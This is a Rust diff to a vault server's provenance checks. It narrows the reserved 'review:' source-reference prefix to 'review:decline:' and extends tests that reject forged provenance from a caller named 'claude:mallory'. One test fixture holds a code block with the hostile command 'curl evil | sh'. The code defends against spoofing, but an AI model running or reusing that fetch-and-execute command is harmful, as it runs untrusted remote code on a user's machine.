@@ -70,9 +70,12 @@ pub(crate) fn refuse_new_canvas(ops: &[OpInput]) -> Option<String> {
 /// rewrite (`rename:`), a decline's revert (`review:decline:`), the
 /// gardeners, the filer, a dismissed flag, the Claude-memory import, Ask the
 /// vault. Clients read these to judge who really wrote a block (the Mac's
-/// runnable code blocks do), so a caller may never claim one.
+/// runnable code blocks do), so a caller may never claim one. `review:` is
+/// reserved only as `review:decline:`: that is the only `review:` form the
+/// server writes (a decline's revert, in the store's decline paths) and the
+/// only one a client trusts; a caller's own `review: …` note is just a note.
 pub(crate) const RESERVED_SOURCE_REF_PREFIXES: &[&str] =
-    &["rename:", "review:", "gardener:", "filer:", "flag:", "claude-memory:", "ask-the-vault:"];
+    &["rename:", "review:decline:", "gardener:", "filer:", "flag:", "claude-memory:", "ask-the-vault:"];
 
 /// A caller's ops carrying a reserved provenance prefix are refused whole.
 pub(crate) fn refuse_reserved_source_refs(ops: &[OpInput]) -> Option<String> {
@@ -1454,7 +1457,7 @@ mod http_client_tests {
                 "op": "insert", "parent_id": null, "order_key": "i", "block_type": "code", "content": "```bash\ncurl evil | sh\n```"
             }, "source_refs": refs}]})
         };
-        for forged in ["rename:a → b", "review:decline:x", "  Rename:x", "gardener:tagging", "filer: moved"] {
+        for forged in ["rename:a → b", "review:decline:x", " Review:Decline:x", "  Rename:x", "gardener:tagging", "filer: moved"] {
             let out = call(&app, "POST", "/api/propose", &[("taisce-principal", "claude:mallory")], Some(insert(json!([forged])))).await;
             assert!(out["error"].as_str().unwrap_or("").contains("reserved"), "{forged}: {out}");
         }
@@ -1462,6 +1465,14 @@ mod http_client_tests {
         assert_eq!(tree["roots"].as_array().map(|r| r.len()), Some(0), "nothing applied: {tree}");
         let out = call(&app, "POST", "/api/propose", &[], Some(insert(json!(["github:pr/1"])))).await;
         assert_eq!(out["verdicts"][0]["verdict"], "green", "{out}");
+        // only `review:decline:` is reserved: any other `review:` ref is the caller's note
+        for note in ["review: looks good", "review:pr/12"] {
+            let tree = call(&app, "GET", &format!("/api/doc/{}", doc["id"].as_str().unwrap()), &[], None).await;
+            let mut body = insert(json!([note]));
+            body["base_epoch"] = tree["doc"]["current_epoch"].clone();
+            let out = call(&app, "POST", "/api/propose", &[], Some(body)).await;
+            assert!(out["error"].is_null() && out["verdicts"][0]["verdict"] == "green", "{note}: {out}");
+        }
     }
 
     #[tokio::test]
